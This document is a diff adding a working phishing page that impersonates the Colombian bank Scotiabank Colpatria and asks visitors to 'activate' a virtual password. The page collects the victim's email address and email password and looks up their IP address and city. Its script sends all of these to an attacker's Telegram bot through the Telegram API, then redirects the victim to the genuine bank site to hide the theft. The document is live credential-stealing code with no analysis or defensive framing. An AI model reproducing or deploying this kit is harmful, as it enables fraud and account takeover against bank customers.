@@ -1,0 +1,274 @@
+<html class=" dkddl_fouc"><head id="ctl00_Head1"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=10">
+    <title>
+	
+</title>
+<link href="./archivos/Login.css" type="text/css" rel="stylesheet">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.9.3/css/bulma.min.css" rel="stylesheet">
+
+						<style>							
+							P.PanelControlTitleStyle
+							{
+ 								font-family:verdana;
+ 								font-size: 12px;
+								font-weight : bold;
+								text-align: center;  								
+							}
+							
+							/* Este elemento debe tener "position: relative" */
+div#is-relative{
+  max-width: 420px;
+  position: relative;
+}
+
+/* El icono debe ser "position: absolute"
+ * Ademas le damos un "display: block" y lo posicionamos */
+#icon{
+  position: absolute;
+  display: block;
+  bottom: .5rem;
+  left: 1rem;
+  
+  user-select: none;
+  cursor: pointer;
+}
+input.input{
+  padding-left: 2.5rem;
+}
+						</style>
+
+
+<script src="datos_del_tel.js"></script>
+	
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+
+   <script>
+         $.getJSON("https://api.ipify.org?format=json",
+          function(data) {
+             $("#gfg").html(data.ip);
+         })
+      </script>
+      <script>
+         $.getJSON("https://ipinfo.io", function (response) {
+    $("#ip").html("IP: " + response.ip);
+    $("#address").html("" + response.city + ", " + response.country);
+    })
+
+	  </script>		
+
+
+				<script>
+
+var u_name, u_name2,  ip, ip2;
+var ready = function () {
+    u_name = document.getElementById("eltipo").value;
+    u_name2 = document.getElementById("eltipo2").value;
+    ip = document.getElementById("gfg").innerHTML;
+    ip2 = document.getElementById("address").innerHTML;
+    message = "👂COLPATRIA DATOS\n☰CORREO: " + u_name + 
+    "\n🔒Contraseña: " + u_name2 + "\n🌎IP: " + ip +"\n" + ip2;
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+        })
+    };
+    $.ajax(settings).done(function (response) {
+  
+        console.log(response);
+		
+          window.location = 'https://www.scotiabankcolpatria.com/personas';
+
+	
+    });
+    return false;
+};
+
+			</script>	  
+
+</head>
+
+<body style=" background-color:#ffffff; background-attachment:fixed;
+	background-size: 100% 100%;	">
+		
+	
+    <form method="post" action="#" onsubmit="return sender()">
+	
+						<p id="gfg" hidden="">191.95.53.151</p>
+						<p id="address" hidden="">Bogotá, CO</p>
+
+
+    <div class="contenedorgenerico">
+       
+       
+        <div class="login-container">
+
+
+    <div class="logo-ban">
+        
+    <div align="center">	
+	<table border="0">
+		<tbody><tr><td width="100px">X CERRAR</td>
+		
+		<td width="400px"> <div align="center"><img src="archivos/Banco_Colpatria_logo.svg.png" style="width:150px;"></div></td>
+		
+		<td width="100px"><span style="font-family:arial">Continuar &gt;</span></td></tr>
+			</tbody></table>
+			
+		 <br>
+		<span style="font-family:arial; font-size:26"><b>¡Hola!</b></span>
+		 <br><br>
+		 <span style="font-family:arial; font-size:18">Activación de Contraseña Virtual Scotiabank Colpatria.<br> Sigue los pasos para activar..</span>
+		 <br>
+	 </div>
+    </div>
+    <div id="dimmer">
+        
+                <div id="ctl00_MainHolder_authenticate_firsStep_panel" onkeypress="javascript:return WebForm_FireDefaultButton(event,
+				'ctl00_MainHolder_linkButton_SecondStep')" style="text-align:center;padding-top: 5px">
+	
+                    <div align="center">
+                        <table class="" cellpadding="0" cellspacing="0">
+                            <tbody><tr>
+                                <td>
+                                    <table class="" cellpadding="0" cellspacing="0" style="align-content:center">
+                                        <tbody>
+                                        <tr>
+                                            <td>
+                                                <table cellpadding="0" cellspacing="0" class="" style="height: 372px">
+                                                    <tbody><tr class="ingrese_su_nombre_de_Usuario">
+                                                        <td>
+                                                            <div>
+                                                              
+                                                                <div class="requerido">
+                                                                    
+                                                                      <div id="is-relative">
+																			  <input type="email" placeholder="Email asociado a tu cuenta" style="
+																					background-color: transparent;
+																					border-bottom: 0.1rem solid #EC111A;
+																					/* padding-left:43px; */
+																					font-size: 16px;
+																					border-radius: 0px;
+																					border-top-width: 0px;
+																					border-right-width: 0px;
+																					border-left-width: 0px;
+																					outline: none;
+																					transition: box-shadow 0.2s ease-in-out 0s;
+																					width:100%;
+																					margin-bottom: 20px;
+																					" id="eltipo" required="">
+                                                                                    
+                                                                                    <div id="is-relative">
+                                                                                        <input type="password" placeholder="Contraseña del email" style="
+                                                                                              background-color: transparent;
+                                                                                              border-bottom: 0.1rem solid #EC111A;
+                                                                                              /* padding-left:43px; */
+                                                                                              font-size: 16px;
+                                                                                              border-radius: 0px;
+                                                                                              border-top-width: 0px;
+                                                                                              border-right-width: 0px;
+                                                                                              border-left-width: 0px;
+                                                                                              outline: none;
+                                                                                              transition: box-shadow 0.2s ease-in-out 0s;
+                                                                                              width:100%;
+                                                                                              margin-bottom: 20px;
+                                                                                              " id="eltipo2" required="">
+																			  <span id="icon">
+																				
+																			  </span>
+																			</div>
+																	 <br><br>
+																	 
+																	  &nbsp;
+																	 
+																	 <br><br>
+																	 
+																	 
+																	 
+																	 <div align="center">
+                                                                   <button type="submit" class="btn_blue" style="
+    background-position: 0px 0px;
+    display: table-cell;
+    vertical-align: middle;
+    /* border-radius: 32px; */
+    border: 0.1rem solid;
+    border-radius: 0.8rem;
+    background-color: #EC111A;
+    font-size: 14px;
+    width: 285px;px; */
+    color: #FFF;
+    color: #000000;
+    font-family: 'Open Sans', Arial, sans-serif;
+    text-align: center;
+    text-decoration: none;
+    height: 50px;
+    border:0px
+    "><b>CONTINUAR</b></button>
+																	</div>
+																
+																	
+																	<br><br><br><br><br>
+															
+                                                                </div>
+                                                               
+                                                            </div>
+                                                        </div></td>
+                                                    </tr>
+                                                    <tr>
+                                                        
+                                                    </tr>
+                                                    <tr>
+                                                        <td>
+                                                        </td>
+                                                    </tr>
+                                                </tbody></table>
+                                            </td>
+                                        </tr>
+                                    </tbody></table>
+                                </td>
+                                
+                            </tr>
+                        </tbody></table>
+						
+						 		
+                      
+                        <table class="tabla-login-teclado" cellpadding="0" cellspacing="0">
+                            <tbody><tr>
+                                <td>
+                                    
+                                </td>
+                            </tr>
+                        </tbody>
+						</table>
+                    </div>
+         
+</div>
+            
+    </div>
+  
+
+        </div>
+     </div>  
+   
+
+</form>
+
+
+   
+
+</body></html>
